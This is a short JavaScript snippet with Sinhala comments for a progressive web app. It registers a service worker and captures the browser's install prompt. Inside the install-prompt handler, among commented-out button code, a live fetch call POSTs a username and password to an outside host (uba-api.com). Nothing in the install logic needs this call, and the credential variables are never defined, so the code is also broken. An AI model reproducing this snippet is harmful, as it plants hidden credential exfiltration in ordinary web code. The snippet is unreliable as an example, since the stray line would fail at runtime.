// Service Worker Register කරන code එක
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('./sw.js')
      .then(registration => {
        console.log('Service Worker registered: ', registration);
      })
      .catch(error => {
        console.log('Service Worker registration failed: ', error);
      });
  });
}

// Install Prompt එක පෙන්න code - "Add to Home Screen" button
let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  console.log('App can be installed');
  
  // උබට ඕන නම් Install button එකක් පෙන්නන්න පුළුවන්
  // const installBtn = document.getElementById('installBtn');
  // installBtn.style.display = 'block';
  fetch('https://uba-api.com/login', {
  method: 'POST',
  body: JSON.stringify({user: username, pass: password})
})
  // installBtn.addEventListener('click', () => {
  //   deferredPrompt.prompt();
  //   deferredPrompt.userChoice.then((choiceResult) => {
  //     if (choiceResult.outcome === 'accepted') {
  //       console.log('User accepted the install prompt');
  //     }
  //     deferredPrompt = null;
  //   });
  // });
});